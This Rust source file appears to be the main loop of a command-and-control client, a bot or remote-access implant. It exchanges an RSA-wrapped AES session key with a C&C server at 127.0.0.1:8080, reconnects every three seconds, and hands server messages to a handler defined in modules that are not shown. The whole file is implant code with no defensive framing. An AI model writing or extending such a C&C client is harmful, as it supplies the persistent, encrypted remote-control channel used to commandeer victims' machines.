use std::thread;
use std::time::Duration;
use tokio::io::AsyncWriteExt;

mod crypto;
mod socket;

const IP: &'static str = "127.0.0.1";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // This is a reconnection loop if something goes wrong.
    let (k, n) = crypto::generate_aes();

    let handshake = format!("{} {}", base64::encode(&k.0), base64::encode(&n.0));

    loop {
        thread::sleep(Duration::from_millis(3000));
        // connect to the socket
        let connection = socket::connect_to_cnc(IP, PORT).await;

        if let Err(_) = connection {
            continue;
        } // Break if connection is refused.

        println!("Connected to C&C server successfully");

        let mut stream = socket::SocketStream::new(connection.unwrap(), &k, &n);

        // send handshake
        println!("Sending handshake");
        let rsa_encrypted_handshake =
            crypto::encrypt_with_rsa(handshake.as_bytes().to_vec()).unwrap();
        stream.stream.write_all(&rsa_encrypted_handshake).await?;

        // Message reading loop
        loop {
            let msg = stream.consume_message().await;

            if let Err(ref e) = msg {
                if e.kind() == std::io::ErrorKind::WouldBlock {
                    continue;
                } else {
                    println!("Another error pplllease");
                }
                // break
            } // this error probably indicates about block of the read abilities.

            let (msg, n_bytes) = msg.unwrap();

            if n_bytes == 0 {
                break; // try to reconnect
            }

            let handle_res = stream.handle_msg(msg, n_bytes).await;
            if handle_res.is_err() {
                break // try to reconnect something bad probably happened
            } 
        }

        eprintln!("Disconnected, trying to reconnect in 3 seconds...");
    }
}
